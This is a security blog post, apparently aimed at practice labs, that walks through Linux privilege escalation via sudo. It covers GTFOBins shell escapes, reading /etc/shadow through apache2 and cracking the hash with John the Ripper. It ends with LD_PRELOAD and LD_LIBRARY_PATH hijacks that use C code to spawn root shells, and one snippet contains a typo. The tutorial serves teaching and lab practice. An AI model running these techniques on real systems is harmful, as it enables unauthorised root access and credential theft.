<!DOCTYPE html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Escalating Privileges with Sudo</title>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />

<link rel="stylesheet" href="/application.56db8f450c98e200698def311092699a83c036dcc75dfef2c8f412f8f80c47af.css" integrity="sha256-VtuPRQyY4gBpje8xEJJpmoPANtzHXf7yyPQS&#43;PgMR68=" />





<meta property="og:title" content="Escalating Privileges with Sudo" />
<meta property="og:description" content="Sudo is a powerful command in Linux that allows users to run commands with elevated privileges. When properly configured, sudo can help ensure system security by enabling users to perform only authorised tasks and preventing unauthorised changes to system files. However, if not configured correctly, sudo can be exploited to escalate privileges and gain access to sensitive system files. In this article, we&rsquo;ll take a deep dive into sudo and explore some common privilege escalation techniques that attackers can use to exploit sudo." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/privilege-escalation/linux/sudo-exploitation/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-15T19:23:31+03:00" />
<meta property="article:modified_time" content="2023-05-15T19:23:31+03:00" />

    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Escalating Privileges with Sudo"/>
<meta name="twitter:description" content="Sudo is a powerful command in Linux that allows users to run commands with elevated privileges. When properly configured, sudo can help ensure system security by enabling users to perform only authorised tasks and preventing unauthorised changes to system files. However, if not configured correctly, sudo can be exploited to escalate privileges and gain access to sensitive system files. In this article, we&rsquo;ll take a deep dive into sudo and explore some common privilege escalation techniques that attackers can use to exploit sudo."/>

    
    
<meta name="description" content="Escalating Privileges with Sudo" />


    

    
        
            
            
                
                
                
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1QLV0H8G51"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-1QLV0H8G51', { 'anonymize_ip': false });
}
</script>

            

            
            

            
            

            
            

            

            
        
    




<script>
      theme = localStorage.getItem('darkmode:color-scheme') || 'system';
      if (theme == 'system') {
        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
          theme = 'dark';
        } else {
          theme = 'light';
        }
      }
      document.documentElement.setAttribute('data-theme', theme);
    </script>
  </head>

  <body class="type-posts kind-page" data-bs-spy="scroll" data-bs-target="#TableOfContents" data-bs-offset="80">
    <div class="container-fluid bg-secondary wrapper">
      
      
    

























  




  




  


<nav class="navbar navbar-expand-xl top-navbar shadow " id="top-navbar">
  <div class="container">
    
    <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button">
      <i data-feather="sidebar"></i>
    </button>
    
    <a class="navbar-brand" href="/">
      narycyber</a>
    <button
      class="navbar-toggler navbar-light"
      id="navbar-toggler"
      type="button"
      data-bs-toggle="collapse"
      data-bs-target="#top-nav-items"
      aria-label="menu"
    >
      <i data-feather="menu"></i>
    </button>

    <div class="collapse navbar-collapse dynamic-navbar" id="top-nav-items">
      <ul class="nav navbar-nav ms-auto">
        <li class="nav-item">
          <a class="nav-link" href="/#home">Home</a>
        </li>
        
          
          
            
              
              
                <li class="nav-item">
                  <a class="nav-link" href="/#about">About</a>
                </li>
              
            
            
              
              
                <li class="nav-item">
                  <a class="nav-link" href="/#skills">Skills</a>
                </li>
              
            
            
              
              
                <li class="nav-item">
                  <a class="nav-link" href="/#recent-posts">Recent Posts</a>
                </li>
              
            
            
              
              
                <li class="nav-item">
                  <a class="nav-link" href="/#experiences">Experiences</a>
                </li>
              
            
          
        
        
          <div id="top-navbar-divider"></div>
        
        
          <li class="nav-item">
            <a class="nav-link" id="blog-link" href="/posts">Posts</a>
          </li>
        
        
        
            
        
        
        
          <li class="nav-item dropdown">
<a class="nav-link dropdown-toggle"  href="#" id="themeSelector" role="button"
  data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
  <img id="navbar-theme-icon-svg" class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
</a>
<div id="themeMenu" class="dropdown-menu dropdown-menu-icons-only" aria-labelledby="themeSelector">
  <a class="dropdown-item nav-link" href="#" data-scheme="light">
    <img class="theme-icon" src="/icons/sun-svgrepo-com.svg" width=20 alt="Light Theme">
  </a>
  <a class="dropdown-item nav-link" href="#" data-scheme="dark">
    <img class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
  </a>
  <a class="dropdown-item nav-link" href="#" data-scheme="system">
    <img class="theme-icon" src="/icons/computer-svgrepo-com.svg" width=20 alt="System Theme">
  </a>
</div>
</li>

        
      </ul>
    </div>
  </div>
  
  
  
</nav>



      
      
  <section class="sidebar-section" id="sidebar-section">
    <div class="sidebar-holder">
      <div class="sidebar" id="sidebar">
        <form class="mx-auto" method="get" action="/search">
          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
        </form>
        <div class="sidebar-tree">
          <ul class="tree" id="tree">
            <li id="list-heading"><a href="/posts/" data-filter="all">Posts</a></li>
            <div class="subtree">
                
  
  
  
  
  
    
    <li><a class=" list-link" href="/posts/welcome/" title="Hey, Welcome">Hey, Welcome</a></li>
  

  
  
  
  
  
    
    <li>
      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/api-penetration-testing/"> Api Penetration Testing</a>
      
      <ul class="">
        
  
  
  
  
  
    
    <li><a class=" list-link" href="/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/" title="OWASP API10 via VAPI">OWASP API10 via VAPI</a></li>
  


      </ul>
    </li>
  

  
  
  
  
    
    
  
  
    
    <li>
      <i data-feather="minus-circle"></i><a class="active list-link" href="/posts/privilege-escalation/"> Privilege Escalation</a>
      
      <ul class="active">
        
  
  
  
  
    
    
  
  
    
    <li>
      <i data-feather="minus-circle"></i><a class="active list-link" href="/posts/privilege-escalation/linux/"> Linux</a>
      
      <ul class="active">
        
  
  
  
  
    
    
  
  
    
    <li><a class="active list-link" href="/posts/privilege-escalation/linux/sudo-exploitation/" title="Sudo Exploitation">Sudo Exploitation</a></li>
  


      </ul>
    </li>
  

  
  
  
  
  
    
    <li>
      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/privilege-escalation/windows/"> Windows</a>
      
      <ul class="">
        
  
  
  
  
  
    
    <li><a class=" list-link" href="/posts/privilege-escalation/windows/setting-up-a-lab/" title="Setting Up a lab">Setting Up a lab</a></li>
  

  
  
  
  
  
    
    <li><a class=" list-link" href="/posts/privilege-escalation/windows/service-misconfigurations/" title="Service Misconfiguration">Service Misconfiguration</a></li>
  


      </ul>
    </li>
  


      </ul>
    </li>
  

  
  
  
  
  
    
    <li><a class=" list-link" href="/posts/vulnhub/" title="Vulnhub walkthrough">Vulnhub walkthrough</a></li>
  

  
  
  
  
  
    
    <li>
      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/toolkit/"> Toolkit</a>
      
      <ul class="">
        
  
  
  
  
  
    
    <li><a class=" list-link" href="/posts/toolkit/accesschk.exe/" title="Accesschk.exe">Accesschk.exe</a></li>
  


      </ul>
    </li>
  


            </div>
          </ul>
        </div>
      </div>
    </div>
  </section>


      
      
<section class="content-section" id="content-section">
  <div class="content">
    <div class="container p-0 read-area">
      
      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(/posts/privilege-escalation/linux/sudo-exploitation/hero.jpg);'>
      </div>

      
      <div class="page-content">
        
        <div class="author-profile ms-auto align-self-lg-center">
          <img class="rounded-circle" src='/images/author/justus_hu21da735d27193e38d6c7d690c3134560_66867_120x120_fit_box_3.png' alt="Author Image">
          <h5 class="author-name">Justus Juvenary</h5>
          <p class="text-muted">Monday, May 15, 2023</p>
        </div>
        
        
        <div class="title">
          <h1>Escalating Privileges with Sudo</h1>
        </div>

        

        
        <div class="post-content" id="post-content">
          <p>Sudo is a powerful command in Linux that allows users to run commands with elevated privileges. When properly configured, sudo can help ensure system security by enabling users to perform only authorised tasks and preventing unauthorised changes to system files. However, if not configured correctly, sudo can be exploited to escalate privileges and gain access to sensitive system files. In this article, we&rsquo;ll take a deep dive into sudo and explore some common privilege escalation techniques that attackers can use to exploit sudo.</p>
<h3 id="key-points">Key points.</h3>
<ul>
<li>Sudo is a program that allows users to run other programs with security privileges, even with other users.</li>
<li>A user generally has to enter the password of their own user account in order to run a command using sudo.</li>
<li>The user must be granted access in the /etc/sudoers file.</li>
<li>Permissions can vary; for example, users can be limited to running only certain programs, or they can be allowed to run commands without entering a password.</li>
</ul>
<p>To get your hands on a keyboard, you can either use this lab <a href="https://github.com/sagishahar/lpeworkshop" target="_blank" rel="noopener">https://github.com/sagishahar/lpeworkshop</a> or this <a href="https://tryhackme.com/room/linuxprivesc" target="_blank" rel="noopener">https://tryhackme.com/room/linuxprivesc</a></p>
<p>Here are some different methods of privilege escalation using sudo.</p>
<h2 id="method-1">Method 1.</h2>
<h3 id="known-password">Known Password.</h3>
<p>If a user is permitted to run sudo for every command (unrestricted) and has the user&rsquo;s password, privilege escalation is easy - they can simply run <code>sudo su</code> and provide the password.
Example.
<img src="Pasted_image_20230512143715.png" alt="sudo_su"></p>
<p>If the user does not have permission to run every program, including su, then the technique mentioned earlier won&rsquo;t work. Example
<img src="Pasted_image_20230512144154.png" alt="sudo_su_"></p>
<p>If <code>su</code> is not allowed, there are other ways to escalate privileges using sudo. Some examples include:</p>
<pre tabindex="0"><code>
sudo /bin/bash
sudo passwd 
sudo -i
sudo -s
</code></pre><p>To learn more about sudo, you can run <code>man sudo</code> on a Linux machine. If the above techniques fail, check the next step.</p>
<h2 id="method-2">Method 2.</h2>
<h3 id="shell-escape-sequences">Shell Escape Sequences.</h3>
<p>In Linux, shell escape sequences are sequences of characters that are recognised by the shell (such as bash) and are used to perform various actions, including executing commands or running programs.</p>
<p>Shell escape sequences can be used to bypass restrictions or to perform actions that are not typically allowed within the current context of the shell. For example, if a user is not authorised to run a particular command, they might be able to use a shell escape sequence to execute the command anyway.</p>
<p>If certain programs are not allowed to be run via sudo, it is still possible to escape the program and spawn a shell. To achieve this, follow the steps below:</p>
<ul>
<li>Run <code>sudo -l</code> to list all the programs a user can run via sudo.</li>
<li>From the output, check each program in the list to see if there is a shell escape sequence on <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a>.</li>
<li>If an escape sequence exists, follow the given instructions to spawn a shell.</li>
</ul>
<p>Let&rsquo;s see how this works using our lab.</p>
<h4 id="step-1">Step 1.</h4>
<ul>
<li>Run <code>sudo -l</code> to see the results.
<img src="Pasted_image_20230512160938.png" alt="sudo-l"></li>
<li>From the above results, we can see that a user may run different programs on this host, such as <code>iftop</code>, <code>find</code>, <code>nano</code>, <code>vim</code>, <code>man</code>, <code>awk</code>, <code>less</code>, <code>ftp</code>, <code>nmap</code>, <code>apache2</code>, and more via sudo</li>
</ul>
<h4 id="step-2">Step 2.</h4>
<p>Let&rsquo;s see which commands have escape sequences on the <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> website.</p>
<p>In this blog, I am going to use the <code>less</code> program, but you can try to see if other programs have escape sequences as well.</p>
<ul>
<li>To check if there is an escape sequence for the <code>less</code> program, go to the <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> website and search for <code>less</code> in the search box.
<img src="Pasted_image_20230512161712.png" alt="less"></li>
<li>The results show that we do have an escape sequence for our program</li>
</ul>
<h4 id="step-3">Step 3.</h4>
<ul>
<li>To proceed, click on the &ldquo;Sudo&rdquo; option (the first option on the right).
<img src="Pasted_image_20230512161828.png" alt="sudo-less">
As we can see, here is our escape sequence to get a shell for less program.</li>
</ul>
<pre tabindex="0"><code>
sudo less /etc/profile
! /bin/sh 

or

sudo less /etc/profile
! /bin/bash 
</code></pre><h4 id="step-4">Step 4.</h4>
<p>Let&rsquo;s go back to our lab and run the command <code>sudo less /etc/profile</code>
<img src="Pasted_image_20230512162203.png" alt="etc/profile"></p>
<p>After running the above command. Insert <code>! /bin/bash</code> and press enter.
<img src="Pasted_image_20230512162306.png" alt="root"></p>
<ul>
<li>As you can see from the above output, we have successfully escalated our privileges.</li>
</ul>
<p>Take some time to go through the other programs we found earlier and try to escalate privileges. If a program does not have an escape sequence, we can still try to use it to escalate our privileges using the below explained methods.</p>
<h2 id="method-3">Method 3.</h2>
<h3 id="abusing-intended-functionality">Abusing Intended Functionality</h3>
<p>As the name suggests, we are abusing the intended functionality to escalate our privileges. We only resort to this method after finding out that a program that can be run via sudo has no escape sequence.</p>
<ul>
<li>If we can read or write files owned by root, we may be able to retrieve information such as passwords and hashes that will help us access root privileges, or insert/modify information in that file.</li>
</ul>
<h4 id="step-1-1">Step 1.</h4>
<p>Run this command (<code>sudo -l</code>)
We tried to find escape sequences for the programs on the list we generated on the <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> website. We were successful in finding escape sequences for the majority of them, except for <code>apache2</code>.
<img src="Pasted_image_20230512164607.png" alt="apache2">
Apache2 has no known escape sequence.</p>
<h4 id="step-2-1">Step 2.</h4>
<p>Let&rsquo;s use apache2 as it is intended, if you run <code>man apache2</code> the interesting option is -f
<img src="Pasted_image_20230512165904.png" alt="config-f"></p>
<h4 id="step-3-1">Step 3.</h4>
<p>Running the apache2 command with <code>-f option</code>  when parsing a config file it will error and print any line it doesn&rsquo;t understand.<br>
Example Run <code>sudo apache2 -f /etc/passwd</code>
<img src="Pasted_image_20230514002922.png" alt="sudo_apache2"></p>
<ul>
<li>We can see from the output, the command returned error but with some results in the /etc/passwd file.</li>
<li>To understand this more, try different config files and see the results returned.</li>
</ul>
<h4 id="step-4-1">Step 4</h4>
<p>Since passwords are stored in <code>/etc/shadow</code>, let&rsquo;s try to use apache2 on this file.
<code>sudo apache2 -f /etc/shadow</code>
<img src="Pasted_image_20230514003244.png" alt="hash"></p>
<ul>
<li>As expected, the command threw synstax error on line 1 of /etc/shadow and printed back the line which in this case it is a password hash.</li>
<li>Save the password hash to the file (eg. passwd.txt)
<img src="Pasted_image_20230515141503.png" alt="password.txt"></li>
</ul>
<h4 id="step-5">Step 5.</h4>
<ul>
<li>Use your favourite tool to crack the hash using a wordlist. Example John the Ripper.
<code>john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyour.txt password.txt</code>
<img src="Pasted_image_20230515141625.png" alt="john-crack"></li>
<li>From the output, the password is <code>password123</code></li>
</ul>
<h4 id="step-6">Step 6</h4>
<p>Switch to root.</p>
<ul>
<li>Use the password from the above step to switch user <code>su</code> to root.
<img src="Pasted_image_20230515142036.png" alt="su_root"></li>
<li>From the above results, we have successfully escalate out privileges.</li>
</ul>
<h2 id="method-4">Method 4</h2>
<h3 id="environment-variables">Environment Variables</h3>
<p>Environment variables are variables that are set in the operating system&rsquo;s environment and are accessible to all programs and hold system information that can guide their behaviour.
Example $PATH, $HOME, $USER.</p>
<p>Programs that run through sudo can inherit the user&rsquo;s environment variables.
The most common environment variable that can be exploited to escalate privileges are</p>
<ul>
<li>LD_PRELOAD</li>
<li>LD_LIBRARY_PATH</li>
</ul>
<p>The above environment variables can only help us escalate privileges when the <code>env_keep</code> option is set in the <code>/etc/sudoers</code> configuration file to either of the above environment variables. <code>env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH</code></p>
<p>To see if the <code>env_keep</code> option is set to the environment variables mentioned above, use <code>sudo -l</code>. Alternatively, if you have sudo password, you can run <code>sudo cat /etc/sudoers</code>.</p>
<p><img src="Pasted_image_20230514014035.png" alt="env_variables"></p>
<ul>
<li>From our lab, the above output shows that the <code>env_keep</code> option is set to <code>LD_PRELOAD</code> and <code>LD_LIBRARY_PATH</code>.</li>
</ul>
<h3 id="ld_preload">LD_PRELOAD.</h3>
<p>LD_PRELOAD is an environmental variable in Linux that allows users to specify one or more shared libraries to preload before any other shared library. By setting the LD_PRELOAD variable, users can override specific functions in a program, without modifying the original program&rsquo;s source code or binary. LD_PRELOAD is commonly used for debugging, profiling, or adding new functionality to existing programs.</p>
<p>To use this environment variable to escalate our privileges, <code>the real user ID must be the same as the effective user ID.</code></p>
<h4 id="step-1-2">Step 1.</h4>
<p>Create a function using c programming language that will spawn a shell with root privileges when run.</p>
<pre tabindex="0"><code>
#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init(){
	unsetenv(&#34;LD_PRELOAD&#34;);
	setgid(0);
	setuid(0);
	system(&#34;/bin/sh&#34;); 
}
</code></pre><p>You can change <code>/bin/sh</code> to <code>/bin/bash</code>.</p>
<ul>
<li>Save the above file with .c extension
<img src="Pasted_image_20230515114309.png" alt="shell.c"></li>
</ul>
<h4 id="step-2-2">step 2.</h4>
<ul>
<li>Compile the code with this command <code>gcc -fPIC -shared -nostartfiles -o shell.so shell.c</code>
<img src="Pasted_image_20230515114934.png" alt="gcc_shell.c"></li>
</ul>
<h4 id="step-3-2">Step 3.</h4>
<p>Run <code>sudo LD_PRELOAD=/path/filename.so {any allowed program using sudo}</code></p>
<ul>
<li><code>/path/filename.so</code>  Specify the path were the .so file is.</li>
<li><code>{allowed program using sudo</code>} Run sudo -l to see programs that can be run via sudo</li>
</ul>
<p>In our lab let&rsquo;s use <code>less</code> program.</p>
<p><code>sudo LD_PRELOAD=/tmp/shell.so less</code>
<img src="Pasted_image_20230515115605.png" alt="sh_root"></p>
<ul>
<li>From the above results, we have escalated our privileges using less program.</li>
</ul>
<h4 id="step-4-2">Step 4.</h4>
<p>Since all other commands that can run via sudo in our lab has escape sequences except apache2, let&rsquo;s exploit apache2 using the above method of escalating privileges using LD_PRELOAD.</p>
<p>Run <code>sudo LD_PRELOAD=/tmp/shell.so apache2</code>
<img src="Pasted_image_20230515130020.png" alt="sh_via_apache2"></p>
<ul>
<li>From the above output, we have successfully escalated our privileges to root.</li>
<li>This method comes in handy when the program has no escape sequence.</li>
</ul>
<h3 id="ld_library_path">LD_LIBRARY_PATH</h3>
<p>LD_LIBRARY_PATH is an environmental variable in Linux that specifies a list of directories where the system should look for shared libraries when a program is run. The shared libraries are typically files that contain code used by multiple programs on the system. By default, the system searches for shared libraries in a set of standard directories, but users can use the LD_LIBRARY_PATH variable to add additional directories to the search path.</p>
<p>To list shared libraries used by a program, use the command <code>ldd</code> with the path of the program</p>
<h4 id="step-1-3">Step 1.</h4>
<ul>
<li>List all programs that can be run via sudo (<code>sudo -l</code>)
<img src="Pasted_image_20230515142927.png" alt="-sudo-l"></li>
</ul>
<h4 id="sep-2">Sep 2.</h4>
<ul>
<li>Choose a program that you want to use. Example on my side I will use <code>less</code></li>
<li>List libraries of the command you chose. e.g <code>ldd /usr/bin/less</code>
<img src="Pasted_image_20230515143308.png" alt="ldd"></li>
<li>The results above show the libraries for <code>less </code>program.</li>
</ul>
<h4 id="step-3-3">Step 3.</h4>
<ul>
<li>Choose the library to hijack from the list libraries in the above step. You can choose any library. Example let&rsquo;s choose <code>libdl.so.2</code></li>
</ul>
<h4 id="step-4-3">Step 4.</h4>
<ul>
<li>Create a function using c programming language that will hijack our program to spawn a shell.</li>
</ul>
<pre tabindex="0"><code>
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void shell() __attribute__((constructor));

void shell(){
	unsetenv(&#34;LD_LIBRARY_PATH&#34;);
	setgid(0);
	setuid(0);
	systme(&#34;/bin/bash&#34;);
}
</code></pre><ul>
<li>Save file with .c extension with the above contents.
<img src="Pasted_image_20230515144843.png" alt="env-shell.c"></li>
<li>I saved my file as shell.c</li>
</ul>
<h4 id="step-5-1">Step 5.</h4>
<ul>
<li>Compile the above file into the name of the library we chose in step 3 which is <code>libdl.so.2</code> by running the following command
<code>gcc -fPIC -shared -o libdl.so.2 shell.c</code>
(change shell.c to the name of your file, and libdl.so.2 to the name of your selected library)</li>
</ul>
<h4 id="step-6-1">Step 6.</h4>
<p>Run the program you chose on step 2 via sudo while setting <code>LP_LIBRARY_PATH</code> environment variable to the path where we compiled our .c file.
On my lab
<code>sudo LD_LIBRARY_PATH=/home/user less</code>
<img src="Pasted_image_20230515145732.png" alt="root_bash"></p>
<ul>
<li>From the above output, we have successfully escalated our privileges.</li>
</ul>
<p>In conclusion, there are several ways to escalate privileges using the sudo command, which can potentially expose your system to security risks. It is important to be aware of these techniques and take steps to mitigate them.</p>

        </div>

        
        <div class="row ps-3 pe-3">
        
          <div class="col-md-6 share-buttons">
          
          </div>

        
        
          
            
          
          <div class="col-md-6 btn-improve-page">
             
               <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts/Privilege%20Escalation/Linux/sudo%20exploitation/index.md" title="Improve this page" target="_blank" rel="noopener">
            
                <i class="fas fa-code-branch"></i>
                Improve this page
              </a>
          </div>
        
        </div>



      
      <hr />
        







  





  
  

  
  

  
    
    
  
  

  
  

  
  

  
  

  
  


<div class="row next-prev-navigator">
  
    <div class="col-md-6 previous-article">
      <a href="/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/" title="OWASP API Security Top 10 via VAPI Walkthrough" class="btn filled-button">
        <div><i class="fas fa-chevron-circle-left"></i> Prev</div>
        <div class="next-prev-text">OWASP API Security Top 10 via VAPI Walkthrough</div>
      </a>
    </div>
  
  
      
      
        
      
      <div class="col-md-6 next-article">
        <a href="/posts/privilege-escalation/windows/setting-up-a-lab/" title="Windows Privilege Escalation lab" class="btn filled-button">
          <div>Next <i class="fas fa-chevron-circle-right"></i></div>
          <div class="next-prev-text">Windows Privilege Escalation lab</div>
        </a>
      </div>
    
</div>

      <hr />

      
      

      
      

      </div>
    </div>
  </div>
  
  <a id="scroll-to-top" class="btn" type="button" data-bs-toggle="tooltip" data-bs-placement="left" title="Scroll to top">
    <i class="fas fa-chevron-circle-up"></i>
  </a>
</section>


      
      
  <section class="toc-section" id="toc-section">
    
    <div class="toc-holder">
      <h5 class="text-center ps-3">Table of Contents</h5>
      <hr>
      <div class="toc">
        <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#key-points">Key points.</a></li>
      </ul>
    </li>
    <li><a href="#method-1">Method 1.</a>
      <ul>
        <li><a href="#known-password">Known Password.</a></li>
      </ul>
    </li>
    <li><a href="#method-2">Method 2.</a>
      <ul>
        <li><a href="#shell-escape-sequences">Shell Escape Sequences.</a>
          <ul>
            <li><a href="#step-1">Step 1.</a></li>
            <li><a href="#step-2">Step 2.</a></li>
            <li><a href="#step-3">Step 3.</a></li>
            <li><a href="#step-4">Step 4.</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#method-3">Method 3.</a>
      <ul>
        <li><a href="#abusing-intended-functionality">Abusing Intended Functionality</a>
          <ul>
            <li><a href="#step-1-1">Step 1.</a></li>
            <li><a href="#step-2-1">Step 2.</a></li>
            <li><a href="#step-3-1">Step 3.</a></li>
            <li><a href="#step-4-1">Step 4</a></li>
            <li><a href="#step-5">Step 5.</a></li>
            <li><a href="#step-6">Step 6</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#method-4">Method 4</a>
      <ul>
        <li><a href="#environment-variables">Environment Variables</a></li>
        <li><a href="#ld_preload">LD_PRELOAD.</a>
          <ul>
            <li><a href="#step-1-2">Step 1.</a></li>
            <li><a href="#step-2-2">step 2.</a></li>
            <li><a href="#step-3-2">Step 3.</a></li>
            <li><a href="#step-4-2">Step 4.</a></li>
          </ul>
        </li>
        <li><a href="#ld_library_path">LD_LIBRARY_PATH</a>
          <ul>
            <li><a href="#step-1-3">Step 1.</a></li>
            <li><a href="#sep-2">Sep 2.</a></li>
            <li><a href="#step-3-3">Step 3.</a></li>
            <li><a href="#step-4-3">Step 4.</a></li>
            <li><a href="#step-5-1">Step 5.</a></li>
            <li><a href="#step-6-1">Step 6.</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
      </div>
    </div>
    
  </section>

    </div>

    
    












  
  
    
  

  
  
    
  

  
  
    
  

  
  
    
    
      
    
  


  
  
  
    
  

  
  
  

  
  
  
    
  
  

  
  
  

  <footer id="footer" class="container-fluid text-center align-content-center footer pb-2">
    <div class="container pt-5">
      <div class="row text-start">
        
        <div class="col-md-4 col-sm-12">
          <h5>Navigation</h5>
          
          <ul>
              
                
                
                  
                
                <li class="nav-item">
                  <a class="smooth-scroll" href="http://localhost:1313/#about">About</a>
                </li>
              
              
                
                
                  
                
                <li class="nav-item">
                  <a class="smooth-scroll" href="http://localhost:1313/#skills">Skills</a>
                </li>
              
              
                
                
                  
                
                <li class="nav-item">
                  <a class="smooth-scroll" href="http://localhost:1313/#recent-posts">Recent Posts</a>
                </li>
              
              
                
                
                  
                
                <li class="nav-item">
                  <a class="smooth-scroll" href="http://localhost:1313/#experiences">Experiences</a>
                </li>
              
            
              
                
              
            
          </ul>
          
        </div>
        
        
        <div class="col-md-4 col-sm-12">
          <h5>Contact me:</h5>
          <ul>
            
              
                <li><a href=mailto:jusnary1@gmail.com target="_blank" rel="noopener">
                  <span><i class="fas fa-envelope"></i></span> <span>jusnary1@gmail.com</span>
                </a></li>
              
            
              
                <li>
                  
                  <a href=https://www.linkedin.com/in/justus-juvenary target="_blank" rel="noopener">
                    <span><i class=fab&#32;fa-linkedin></i></span> <span>Justus Juvenary</span>
                  </a>
                  
                </li>
              
            
          </ul>
        </div>
        
        
        
      </div>
    </div>
    
    
    <hr />
    <div class="container">
      <div class="row text-start">
        <div class="col-md-4">
          <a id="theme" href="https://www.linkedin.com/in/justus-juvenary/" target="_blank" rel="noopener">
            Justus Juvenary
          </a>
        </div>
        <div class="col-md-4 text-center">© 2024 Copyright.</div>
        <div class="col-md-4 text-end">
          <a id="hugo" href="https://www.narycyber.com/" target="_blank" rel="noopener">
            NaryCyber
          </a>
        </div>
      </div>
    </div>
    
  </footer>


    <script src="/application.b91ad4f8dcfc23b15c9ba98e2b039a62fd05938843f9092a89760a31bc5b2cd4.js" integrity="sha256-uRrU&#43;Nz8I7Fcm6mOKwOaYv0Fk4hD&#43;QkqiXYKMbxbLNQ=" defer></script>


    
     

    
</body>
</html>
